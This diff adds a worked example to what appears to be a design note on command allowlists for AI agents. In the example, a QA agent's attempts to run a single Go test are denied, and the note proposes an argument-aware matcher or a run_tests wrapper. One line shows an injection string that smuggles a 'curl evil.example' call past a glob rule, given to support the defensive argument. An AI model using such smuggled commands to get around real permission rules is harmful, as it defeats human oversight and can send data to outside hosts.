@@ -112,6 +112,57 @@ Once the blessed set covers the common cases, raw `bash` becomes the rare escape
 hatch it should be — which makes a strict, small allowlist realistic rather than
 something operators route around with `*`.
 
+### 5. Worked example — running one test (run `97078a4c1bf40c04`, 2026-08-30)
+
+The qa agent was verifying `lifecycle/tests/agent-permission-precheck-6-test.md`,
+whose subject is `tests/integration/agent_precheck_test.go`. It ran all four
+allow-listed suites, read the architecture standards, and then tried to run the
+one test the artifact is actually about. Four denials, two commands:
+
+```
+go test -v ./tests/integration/...                                        x1
+go test -v ./tests/integration/agent_precheck_test.go -tags=integration   x3
+```
+
+What happened next is the useful part. After the denials it listed
+`tests/integration/`, read the test file, read
+`adr-0006-mediated-agent-driver-permission...`, retried, and finally ran
+`grep("test-", "Makefile")` — searching for a *permitted* route to the same
+result. There was none. The agent behaved correctly and was still blocked.
+
+Two observations:
+
+- **The allowlist only offers whole-suite runs.** Verifying a specific test
+  artifact means running the whole integration suite (5m17s) and reading the
+  result, or nothing. There is no granular option at any price.
+- **The command would have failed even if allowed.** `go test` on a single
+  `_test.go` file compiles it in isolation, so it would not have found the
+  helpers in `agent_helpers_test.go`. The agent was reaching for something that
+  does not work in this repo's layout — a blessed tool would have encoded the
+  correct invocation once instead of leaving each agent to guess it.
+
+This is the case that exact-string allow-listing cannot serve. The natural fix is
+a target such as:
+
+```make
+test-one:   ## make test-one RUN=TestAgentPrecheck
+	go test ./tests/integration -tags=integration -run '$(RUN)' -count=1
+```
+
+but `make test-one RUN=...` has a variable argument, so it cannot be allow-listed
+as an exact string, and `make test-one *` reopens the injection hole from
+finding 1 — `make test-one X; curl evil.example` matches the glob. The requirement
+is a matcher that understands **argument boundaries**, or a blessed tool that
+never builds a command string at all:
+
+```
+run_tests(suite: "integration", filter: "TestAgentPrecheck")
+```
+
+which is the `run_tests` wrapper proposed in finding 4, with the filter argument
+added. The denials cost this run roughly four turns of a twenty-turn budget
+before it died of an unrelated `provider_disconnected`.
+
 ### Related
 
 Queue-pause behaviour was separated at the same time: an allowlist miss on a
